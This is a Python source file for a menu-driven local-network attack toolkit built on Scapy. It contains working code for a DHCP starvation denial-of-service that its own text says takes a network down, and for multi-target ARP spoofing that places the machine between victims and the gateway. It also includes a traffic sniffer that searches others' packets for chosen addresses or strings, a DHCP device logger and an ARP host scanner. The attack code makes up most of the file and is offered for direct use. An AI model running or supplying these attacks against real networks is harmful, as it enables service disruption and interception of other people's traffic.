from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import TCP, IP, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Packet
from scapy.layers.inet6 import IPv6
from scapy.sendrecv import send
from scapy.layers.dhcp import BOOTP, DHCP
import pandas as pd
from colorama import Fore, Back, Style
import ctypes
import os
import re
from time import sleep
from keyboard import is_pressed
import time
import contextlib
from threading import Thread
from ipaddress import IPv4Network
import netifaces

# needs administrator privileges

conf.checkIPaddr = False  # Disabling the IP address checking to prevent any IP conflicts
conf.sniff_promisc = True


class ArgumentError(Exception):
    pass


class DHCPStarvation:
    def __init__(self) -> None:
        """
        Object constractor
        """
        self.dst_mac = 'ff:ff:ff:ff:ff:ff'
        self.dst_ip = '255.255.255.255'
        self.src_ip = '0.0.0.0'

    def generate_discover_packet(self) -> Packet:
        """
        this function generates a packet that will be used to tire the dhcp server of the network.
        :return: packet
        """
        # Making an Ethernet packet
        return Ether(dst=self.dst_mac, src=RandMAC(), type=0x0800) / IP(src=self.src_ip, dst=self.dst_ip) / UDP(
            dport=67, sport=68) / BOOTP(op=1, chaddr=RandMAC()) / DHCP(options=[('message-type', 'discover'), 'end'])

    def start(self) -> None:
        """
        this function starts executes the attack.
        :return: None
        """
        sendp(self.generate_discover_packet(), loop=1, verbose=1)


class ARPSpoofing:
    def __init__(self):
        """
        the object constructor.
        """
        self.mac = "ff:ff:ff:ff:ff:ff"
        self.hosts = {}

    def get_mac(self, ip: str) -> str:
        """
        this function makes an arp request (who-has) in the network to acquire the mac address of a given ip address.
        :param ip: the ip address of the requested host as a string.
        :return: the mac address of the given ip address (arp answer).
        """
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst=self.mac)
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def spoof(self, target_ip: str, spoof_ip: str) -> None:
        """
        this function makes a spoofed arp packet and sends it to the victim to make him think that the answer
        for the arp request (he didn't make) has been answered by spoof_ip so this computer becomes the gateway
        because he was the massager.
        :param target_ip: a string containing the ip of the target.
        :param spoof_ip: the ip of the fake answerer for the fake arp answer as a string.
        :return: nothing.
        """
        pkt = ARP(op=2, pdst=target_ip, hwdst=self.get_mac(target_ip),
                  psrc=spoof_ip)
        send(pkt, verbose=False)

    def restore(self, destination_ip: str, source_ip: str) -> None:
        """
        this function restore the "damage" that was made by this computer (restore the gateway to not be this computer).
        :param destination_ip: a string containing the ip of the arp packet destination.
        :param source_ip: a string containing the ip of the arp packet source.
        :return: nothing.
        """
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        pkt = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(pkt, verbose=False)

    def process(self, target_ip: str) -> None:
        """
        this function execute the full attack.
        :param target_ip: the ip of the victim in a string.
        :return: nothing.
        """
        gateway_ip = self.get_gateway_ip_address()
        with contextlib.suppress(Exception):
            sent_packets_count = 0
            while self.hosts[target_ip][0]:
                self.spoof(target_ip, gateway_ip)
                self.spoof(gateway_ip, target_ip)
                sent_packets_count += 2
                time.sleep(2)
        with contextlib.suppress(Exception):
            self.hosts[target_ip][0] = False
            self.restore(gateway_ip, target_ip)
            self.restore(target_ip, gateway_ip)

    def add_host(self, ip: str) -> None:
        """
        this function add a new host for multiple attacks.
        :param ip: the ip of the victim.
        :return: nothing.
        """
        self.hosts[ip] = [True, Thread(target=self.process, args=(ip,))]

    def start_host(self, ip: str) -> None:
        """
        this function starts the attack on a given host.
        :param ip: the ip of the victim.
        :return: nothing.
        """
        self.hosts[ip][0] = True
        self.hosts[ip][1].daemon = True
        self.hosts[ip][1].start()

    def stop_host(self, ip: str) -> None:
        """
        this function stops the attack on a given host.
        :param ip: the ip of the victim.
        :return: nothing.
        """
        self.hosts[ip][0] = False

    @staticmethod
    def get_gateway_ip_address() -> str:
        """
        this function returns the ip address of the gateway
        :return: the ip address of the gateway
        """
        return subprocess.Popen(["route -n get default | grep 'gateway' | awk '{print $2}'"],
                                stdout=subprocess.PIPE,
                                shell=True).stdout.read().decode().replace("\n", "")

    @staticmethod
    def get_hosts() -> list:
        """
        this function lists all the active hosts in the current network.
        :return: list of ip addresses.
        """
        return re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', subprocess.Popen(["arp -a -n"],
                                                                                  stdout=subprocess.PIPE,
                                                                                  shell=True).stdout.read().decode())


class Finder:
    def __init__(self, ip: str = None, mac: str = None, keystring: str = None) -> None:
        """
        Object constructor
        :param ip: a string which represents the ip address the object will search for.
        :param mac: a string which represents the mac address the object will search for.
        :param keystring: a string which represents the keystring the object will search for.
        """
        if all(i is None for i in [ip, mac, keystring]):
            raise ArgumentError("you have to enter at least one argument")
        self.ip = ip
        self.mac = mac
        self.keystring = keystring
        self.sniffer = AsyncSniffer(prn=self.printer)

    def packet_string_analysis(self, pkt: Packet, source: str, dest: str) -> str:
        """
        This functions preforms an analysis of the given packet, and looks for string in the packet that match
        the object keystring.
        :param pkt: the searched packet (mostly a dns packet).
        :param source: a string which represents the source ip/mac address of the packet.
        :param dest: a string which represents the destination ip/mac address of the packet.
        :return: the function yields string log when the object keystring was found inside a packet.
        """
        if pkt.haslayer(DNSQR):
            q_name = pkt[DNSQR].qname
            if type(q_name) == bytes:
                q_name = q_name.decode()
            if self.keystring in q_name or q_name in self.keystring:
                yield f"{source} has made a DNS query for {self.keystring}"
        else:
            layers = list(pkt.layers())
            protocols = list(map(lambda x: str(x).split(".")[-1].replace("'>", ""), layers))
            layers_data = [pkt[layers[i]].show(dump=True) for i in range(len(layers))]
            for index, data in enumerate(layers_data):
                if self.keystring.lower() in str(data).lower():
                    yield f"'{self.keystring}' found in a {protocols[index]} packet, " \
                          f"the network entities involved in the connection: {source} as the source and " \
                          f"{dest} as the destination."

    def packet_analysis(self, pkt: Packet) -> str:
        """
        This function preform the main analysis of the object main process. this function looks at every possible
        packet that can contain the object keystring/ip/mac, preform a deep search, and yield a log when found.
        :param pkt: the searched packet.
        :return: the function yields string log when the object keystring/ip/mac was found inside a packet.
        """
        if pkt.haslayer(ARP) and self.mac is not None:
            source = pkt[ARP].hwsrc
            if source == self.mac:
                yield f"{self.mac} detected trying to find {pkt[ARP].pdst} MAC Address (ARP)."
            source = pkt[ARP].psrc
            if source == self.ip:
                yield f"{self.ip} detected trying to find {pkt[ARP].pdst} MAC Address (ARP)."
        if pkt.haslayer(IP):
            source = pkt[IP].src
            dest = pkt[IP].dst
            if source == self.ip:
                if pkt.haslayer(TCP):
                    yield f"{self.ip} detected sending data on a tcp connection on port {pkt[TCP].sport} to " \
                          f"{pkt[IP].dst}:{pkt[TCP].dport}."
                elif pkt.haslayer(UDP):
                    if pkt.haslayer(DNS):
                        dns_type = "query" if pkt[DNS].opcode == 0 else "answer"
                        yield f"{self.ip} was found in a dns {dns_type} to {dest}"
                    else:
                        yield f"{self.ip} detected sending data on a udp connection on port " \
                              f"{pkt[UDP].sport} to {pkt[IP].dst}:{pkt[UDP].dport}."
            else:
                if self.keystring is None:
                    self.keystring = self.ip
                yield from self.packet_string_analysis(pkt, source, dest)
                if self.ip is not None:
                    tmp = self.keystring
                    self.keystring = self.ip
                    yield from self.packet_string_analysis(pkt, source, dest)
                    self.keystring = tmp
        if pkt.haslayer(Ether):
            source = pkt[Ether].src
            dest = pkt[Ether].dst
            if source == self.mac:
                yield f"Ethernet connection found between {self.mac} and {dest}."
            if pkt.haslayer(IPv6):
                if self.keystring is None:
                    self.keystring = self.mac
                yield from self.packet_string_analysis(pkt, source, dest)
                if self.mac is not None:
                    tmp = self.keystring
                    self.keystring = self.mac
                    yield from self.packet_string_analysis(pkt, source, dest)
                    self.keystring = tmp
            if pkt.haslayer(DHCP):
                dhcp_options = pkt[DHCP].options
                requested_ip, hostname = "", ""
                for item in dhcp_options:
                    if type(item) in [list, tuple]:
                        label, value = item
                        if label == 'requested_addr':
                            requested_ip = value
                        elif label == 'hostname':
                            hostname = value.decode()
                if source == self.mac:
                    yield f"{self.mac} has connected to the network and requested the ip address {requested_ip}"
                if self.keystring == hostname:
                    yield f"'{self.keystring}' was found in a DHCP packet as an hostname that requested the " \
                          f"ip address {requested_ip} for its mac address: {self.mac}"

    def printer(self, pkt: Packet) -> None:
        """
        The object logger function.
        :param pkt: the searched function.
        :return: None.
        """
        if detections := list(set(self.packet_analysis(pkt))):
            time_now = time.strftime("[%Y-%m-%d - %H:%M:%S]")
            down = '\n'
            print(f"\033[4m{time_now}\033[0m\n{f'{down}'.join(detections)}")

    def listen(self) -> None:
        """
        The object main process function.
        :return: None.
        """
        self.sniffer.start()
        while not is_pressed('q'):
            pass
        self.sniffer.stop()
        self.sniffer.join()


class DHCPListener:
    def __init__(self) -> None:
        """
        Object Constractor
        """
        self.sniffer = AsyncSniffer(prn=self.print_packet, filter='udp and (port 67 or port 68)')

    def listen_dhcp(self) -> None:
        """
        this function start the sniffing for dhcp packets
        :return: None
        """
        self.sniffer.start()
        while not is_pressed('q'):
            pass
        self.sniffer.stop()
        self.sniffer.join()

    @staticmethod
    def print_packet(pkt: Packet) -> None:
        """
        this function displays the device details when given a DHCP packet (MAC address, hostname, vendor id number
        and requested ip)
        :param pkt: the current sniffed packet.
        :return: None
        """
        if not pkt.haslayer(DHCP):
            return
        # initialize these variables to None at first
        target_mac, requested_ip, hostname, vendor_id = [None] * 4
        # get the MAC address of the requester
        if pkt.haslayer(Ether):
            target_mac = pkt.getlayer(Ether).src
        # get the DHCP options

        dhcp_options = pkt[DHCP].options
        for item in dhcp_options:
            if type(item) in [list, tuple]:
                label, value = item
                if label == 'requested_addr':
                    # get the requested IP
                    requested_ip = value
                elif label == 'hostname':
                    # get the hostname of the device
                    hostname = value.decode()
                elif label == 'vendor_class_id':
                    # get the vendor ID
                    vendor_id = value.decode()
        if target_mac and vendor_id and hostname and requested_ip:
            # if all variables are not None, print the device details
            time_now = time.strftime("[%Y-%m-%d - %H:%M:%S]")
            print(Fore.WHITE + f"[+] {time_now} : {target_mac}  -  {hostname} / {vendor_id} requested {requested_ip}")


class HostsDiscoverer:
    def __init__(self) -> None:
        """
        Object Constractor
        """
        self.target_ip = self.get_subnet_mask()
        self.broadcasting_mac = "ff:ff:ff:ff:ff:ff"

    def discover(self) -> list:
        """
        this function broadcast a packet and collects responses which contain info about the discovered hosts from the
        broadcast
        :return: a list of hosts
        """
        arp = ARP(pdst=self.target_ip)  # create an ARP packet to the target
        ether = Ether(dst=self.broadcasting_mac)  # create an Ether packet for broadcasting
        pkt = ether / arp  # stack the packets into one
        result = srp(pkt, timeout=15, verbose=0)[0]  # start discovering
        return [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]  # return  a list with all
        # the discovered hosts

    @staticmethod
    def get_subnet_mask() -> str:
        router_ip, iface = netifaces.gateways()["default"][2][0], netifaces.gateways()["default"][2][1]
        netmask = netifaces.ifaddresses(iface)[2][0]["netmask"]
        mask = IPv4Network(f'0.0.0.0/{netmask}').prefixlen
        return f"{router_ip}/{mask}"


class DeviceTable:
    def __init__(self, ips: list[str], macs: list[str]) -> None:
        """
        Object Constractor
        :param ips: list of ip addresses for the IP column
        :param macs: list of mac addresses for the MAC column
        """
        self.down = '\n'
        self.labels = ['IP', 'MAC']
        self.ips = ips
        self.macs = macs
        self.elements = self.generate_rows_list()

    def generate_rows_list(self) -> list:
        """
        this function generates a list that each element in it will be presented as a row,
        and makes sure every row has the save amount of element as the labels list.
        :return: a list of rows
        """
        ips, macs = len(self.ips), len(self.macs)
        max_length = max(ips, macs)
        default = ["NOT FOUND"]
        self.ips.extend(default * (max_length - ips))
        self.macs.extend(default * (max_length - ips))
        return list(map(list, zip(self.ips, self.macs)))

    def __str__(self) -> str:
        """
        The object ToString function.
        :return: the current object as a string.
        """
        return pd.DataFrame(self.elements, columns=self.labels).to_string()


def is_admin() -> bool:
    """
    this function checks if the current program is running with administrator privileges.
    :return: if the current program is running with administrator privileges (bool).
    """
    try:
        is_ad = (os.getuid() == 0)
    except AttributeError:
        is_ad = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_ad


def get_option() -> int:
    """
    this function ask the user for the action he wants to do in the main function.
    :return: the inputted option as an int.
    """
    tmp = input("    Please choose an option (type a number between 1-5): ")
    tmp = tmp if 'q' not in tmp else tmp.replace('q', '')
    return int(tmp) if tmp.isnumeric() and 0 < int(tmp) < 6 else get_option()


def clear() -> None:
    """
    this function clear the console
    :return: None
    """
    os.system('cls' if os.name in ('nt', 'dos') else 'clear')


def underline(string: str) -> str:
    """
    this function add an underline to the given string.
    :param string: a given string that needs an underline added.
    :return: the given string with an underline.
    """
    return f"\033[4m{string}\033[0m"


def get_operation() -> str:
    """
    this function ask the user, what kind of operation he wants to do, as part of the arp spoofing attack.
    :return: the chosen operation as a string.
    """
    tmp = input("To see potential targets type: hosts\n"
                "To stop a running attack type: stop\n"
                "To add an attack type: start\n"
                "To go back to the main menu type: done\n")
    tmp = tmp if '+' not in tmp else tmp.replace('c', '')
    return tmp if tmp in ["hosts", "stop", "start", "done"] else get_operation()


def main():
    """
    The Main Function.
    :return: None
    """
    spoofer = ARPSpoofing()
    logo = """
     ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄ 
    ▐░░▌      ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░▌      ▐░▌
    ▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌░▌     ▐░▌
    ▐░▌▐░▌    ▐░▌▐░▌               ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌
    ▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░▌       ▐░▌▐░▌   ▄   ▐░▌▐░▌ ▐░▌   ▐░▌
    ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌
    ▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀▀▀      ▐░▌     ▐░▌       ▐░▌▐░▌ ▐░▌░▌ ▐░▌▐░▌   ▐░▌ ▐░▌
    ▐░▌    ▐░▌▐░▌▐░▌               ▐░▌     ▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌    ▐░▌▐░▌
    ▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░▌░▌   ▐░▐░▌▐░▌     ▐░▐░▌
    ▐░▌      ▐░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░▌      ▐░░▌
     ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀       ▀▀  ▀        ▀▀ 
                """
    options = """
    1. Appearance Detector.
    2. ARP Spoofer.
    3. DHCP Listener.
    4. Network DOS Attack.
    5. Host Discoverer."""
    while True:
        clear()
        if not is_admin():
            print(Fore.BLACK + Style.BRIGHT + Back.RED + "PROGRAM MUST BE RAN WITH ROOT PRIVILEGES")
            exit(0x45)
        print(Fore.LIGHTGREEN_EX + logo)
        print(Fore.CYAN + options)
        decision = get_option()
        clear()
        for i in ["/", "-", "\\", "-", "/", "-", "\\"]:
            print(f"\rLoading {i}", end="")
            sleep(0.5)
        clear()
        options_dict = {
            1: ["Appearance Detector", "This tool is used to find activity of a network entity using its MAC address,\n"
                                       "IP address and a Keystring.\n"
                                       "Note: These are options and not all is required for a search."],
            2: ["ARP Spoofer", "This tool is used to preform a ARP Spoofing attack on a single target or multiple.\n"
                               "Small explanation: make the given target associate your mac address with the ip of\n"
                               "the gateway.\n"
                               "Note: This tool can ran in the background."],
            3: ["DHCP Listener", "This tool is used to capture the info of a host who connect to the network.\n"
                                 "Note: Hosts that connected to network from the time of activating this tool."],
            4: ["Network DOS Attack", "This tool is used to take down a network.\n"
                                      "Note: The action is done using the DHCP Starvation attack vector."],
            5: ["Host Discoverer", "This tool is used to capture and visualize all the connected hosts in the network."]
        }
        print(underline(options_dict[decision][0]))
        print(Fore.WHITE + options_dict[decision][1])
        print("Press + to continue")
        while not is_pressed('+'):
            pass
        clear()
        if decision == 1:
            arguments = input("Please enter the following arguments: IP address, MAC address, Keystring.\n"
                              "with a space between each one(no need to enter all but at least one is required)\n")[1:]

            ip = re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', arguments)
            if ip is not None:
                ip = ip.group()
                arguments = arguments.replace(ip, "")
            mac = re.match(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", arguments)
            if mac is not None:
                mac = mac.group()
                arguments = arguments.replace(mac, "")
            keystring = arguments if arguments != "" else None
            if keystring[0] == " ":
                keystring = keystring[1:]
            try:
                finder = Finder(ip=ip, mac=mac, keystring=keystring)
            except ArgumentError:
                print("To use tool at least one argument needs to be provided! going back to the main menu...")
            else:
                clear()
                print("Starting the tool... to quit press q.")
                print(f"arguments: {keystring, mac, ip}")
                sleep(2)
                clear()
                finder.listen()
        elif decision == 2:
            if spoofer.hosts != {}:
                print("Spoofer Data:")
                for i in spoofer.hosts.items():
                    if i[1][0]:
                        print(Fore.LIGHTGREEN_EX + f"[+] {i[0]}\n")
                    else:
                        print(Fore.RED + f"[-] {i[0]}\n")
            starter = True
            while starter:
                op = get_operation()
                if op == "hosts":
                    for i in spoofer.get_hosts():
                        print(i)
                if op == "stop":
                    ip = input("type the ip of the target: ")
                    if ip in spoofer.hosts:
                        spoofer.stop_host(ip)
                if op == "start":
                    ip = input("type the ip of the target: ")
                    spoofer.add_host(ip)
                    spoofer.start_host(ip)
                if op == "done":
                    starter = False
        elif decision == 3:
            listener = DHCPListener()
            print("Starting the tool... to quit press q.")
            sleep(2)
            clear()
            print(underline(Fore.WHITE + f'Start time: {time.strftime("[%Y-%m-%d - %H:%M:%S]")}'))
            listener.listen_dhcp()
        elif decision == 4:
            print(Fore.WHITE + "This process can take a long time...\nTo stop the process press CTRL+C.\n"
                               "Note: When you see that the network is no longer online you can stop the process if"
                               "you want to.")
            sleep(5)
            clear()
            DHCPStarvation().start()
        elif decision == 5:
            print("[+] Searching...")
            hd = HostsDiscoverer()
            addresses = hd.discover()
            ips_a = [i['ip'] for i in addresses]
            macs_a = [i['mac'] for i in addresses]
            clear()
            print(DeviceTable(ips_a, macs_a))
            print()
            print("[+] Press q to go back to the main menu...")
            while not is_pressed('q'):
                pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0x45)

# sudo python3 NetOwn.py
